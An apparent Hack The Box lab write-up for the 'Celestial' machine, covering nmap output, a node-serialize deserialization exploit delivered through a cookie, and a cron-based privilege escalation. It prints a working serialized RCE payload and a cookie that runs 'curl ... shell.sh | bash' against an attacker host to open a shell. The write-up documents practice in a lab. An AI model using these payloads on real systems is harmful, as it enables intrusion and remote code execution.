# [Celestial] - [HTB]  
**Difficulty:** [Medium]  
**OS:** [Linux]  
**Date:** [08/09/2025]  

---
---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [ ] Enumeration
  - [ ] Web Exploitation
  - [ ] Privilege Escalation
---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.10.85 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 16:27 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
Initiating Ping Scan at 16:27
Scanning 10.10.10.85 [4 ports]
Completed Ping Scan at 16:27, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:27
Completed Parallel DNS resolution of 1 host. at 16:27, 0.16s elapsed
Initiating SYN Stealth Scan at 16:27
Scanning 10.10.10.85 [1000 ports]
Discovered open port 3000/tcp on 10.10.10.85
Increasing send delay for 10.10.10.85 from 0 to 5 due to 386 out of 964 dropped probes since last increase.
Increasing send delay for 10.10.10.85 from 5 to 10 due to 11 out of 23 dropped probes since last increase.
Completed SYN Stealth Scan at 16:27, 8.25s elapsed (1000 total ports)
Initiating Service scan at 16:27
Scanning 1 service on 10.10.10.85
Completed Service scan at 16:27, 11.91s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.10.85
Initiating Traceroute at 16:27
Completed Traceroute at 16:27, 0.27s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 16:27
Completed Parallel DNS resolution of 2 hosts. at 16:27, 6.63s elapsed
NSE: Script scanning 10.10.10.85.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 6.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 1.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.01s elapsed
Nmap scan report for 10.10.10.85
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2025-09-08 16:27:16 IST for 37s
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/8%OT=3000%CT=1%CU=36786%PV=Y%DS=2%DC=T%G=Y%TM=68BEB6
OS:B1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST
OS:11NW7%O6=M577ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M577NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 207.991 days (since Wed Feb 12 16:40:46 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   265.84 ms 10.10.14.1
2   265.84 ms 10.10.10.85

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.02 seconds
           Raw packets sent: 1526 (68.310KB) | Rcvd: 1090 (44.706KB)
```
When I visit the website i get this error page

<img width="567" height="228" alt="image" src="https://github.com/user-attachments/assets/22449241-f5b4-4b10-800e-2dac28e3ece5" />

But the original error page reveal the system using express js framework

<img width="550" height="184" alt="image" src="https://github.com/user-attachments/assets/7a8e81cb-7e74-4bd7-86f4-a36f7ef4a947" />

The text is exactly the same as Express, but there’s no HTML in this case.
The source is very simple:
```bash
    // If c.Next() does not match, return 404
    err := NewError(StatusNotFound, "Cannot "+c.Method()+" "+c.getPathOriginal())
```
There is cookie if we modified the cookie it replicate the name in what we set as username.

<img width="1919" height="612" alt="image" src="https://github.com/user-attachments/assets/1e4b7b6a-214a-47fe-9cc9-2e1041b650a4" />

I used the node desrialization with cookie
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP/Celestial]
└─$ cat payload.js       
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
                                                                                                                                       
┌──(sabeshan㉿kali)-[~/HTB/OSCP/Celestial]
└─$ node payload.js
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```
this is the crafted the payload with this
<img width="1536" height="646" alt="image" src="https://github.com/user-attachments/assets/b707204d-f282-44ae-845a-deeff7f9f341" />

this is the output for the ping payload now i can tried the revershell
<img width="1919" height="740" alt="image" src="https://github.com/user-attachments/assets/72afb98b-1d5e-47ec-bdc2-fbdef9911432" />

I obatain the shell via this command
```bash
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl http://10.10.14.18:8000/shell.sh| bash', function(error, stdout, stderr)
{ console.log(stdout) })","country":"Idk","city":"Lametown","num":"2"}
```
this log deatil reveal the cronjob happen on the every 5 minutes

<img width="1892" height="448" alt="image" src="https://github.com/user-attachments/assets/ade68df6-00ee-4983-aa25-c7c1be1a15d5" />

this script is writable by sun and has go the root shell via cron.
```bash
sun@celestial:/var/log$ less syslog
sun@celestial:/var/log$ less syslog
sun@celestial:/var/log$ ls -la /home/sun/Documents/script.py
-rw-rw-r-- 1 sun sun 29 Sep  8 06:57 /home/sun/Documents/script.py
sun@celestial:/var/log$ 
```


